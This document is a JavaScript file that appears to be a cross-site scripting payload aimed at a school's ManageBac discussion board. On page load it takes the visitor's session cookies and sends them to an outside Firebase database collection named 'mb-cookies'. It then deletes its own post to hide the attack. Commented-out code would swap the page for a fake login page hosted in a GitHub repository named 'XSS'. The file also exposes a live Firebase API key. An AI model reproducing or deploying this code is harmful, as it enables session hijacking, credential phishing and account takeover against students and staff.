import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import {
  getFirestore,
  addDoc,
  collection,
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyDvix46PGrqV4sIW3tlj-fLlb6mbuDVHj8",
  authDomain: "tnsbeaconhouse-managebac.firebaseapp.com",
  projectId: "tnsbeaconhouse-managebac",
  storageBucket: "tnsbeaconhouse-managebac.appspot.com",
  messagingSenderId: "102801144416",
  appId: "1:102801144416:web:7d3c46ce4a044c81f66105",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

//Delete elements of post
const delPost = () => {
  document.getElementById("discussion-payload-iframe").remove();
  let a = document.getElementById("discussion-payload");
  let discussions = document.getElementsByClassName("discussion");
  while (Object.values(discussions).indexOf(a) === -1) {
    a = a.parentNode;
  }
  a.remove();
};

const main = () => {
  const cookie = document.cookie;

  const redir = () => {
    // window.history.pushState(
    //   "login",
    //   "Managebac | Login",
    //   "https://tnsbeaconhouse.managebac.com/login"
    // );
    // var xhr =
    //   typeof XMLHttpRequest != "undefined"
    //     ? new XMLHttpRequest()
    //     : new ActiveXObject("Microsoft.XMLHTTP");
    // xhr.open(
    //   "get",
    //   "https://cdn.jsdelivr.net/gh/existencing/XSS/managebac_login.html",
    //   true
    // );
    // xhr.onreadystatechange = function () {
    //   if (xhr.readyState == 4 && xhr.status == 200) {
    //     document.body.innerHTML = xhr.responseText;
    //   }
    // };
    // xhr.send();
  };

  const sCookie = async () => {
    try {
      const docRef = await addDoc(collection(db, "mb-cookies"), {
        cookie: cookie,
      });

      console.log("Document written with ID: ", docRef.id);
    } catch (e) {
      console.error("Error adding document: ", e);
    } finally {
      redir();
    }
  };
  sCookie();
};

//check if client firectly on post and redirect if so
if (
  window.location.href !==
  "https://tnsbeaconhouse.managebac.com/student/ib/discussions"
) {
  window.location.replace(
    "https://tnsbeaconhouse.managebac.com/student/ib/discussions"
  );
  window.close();
}
//Check if already stolen
if (localStorage.getItem("gotted") !== "true") {
  main();
}

document.addEventListener("DOMContentLoaded", (event) => {
  delPost();
});
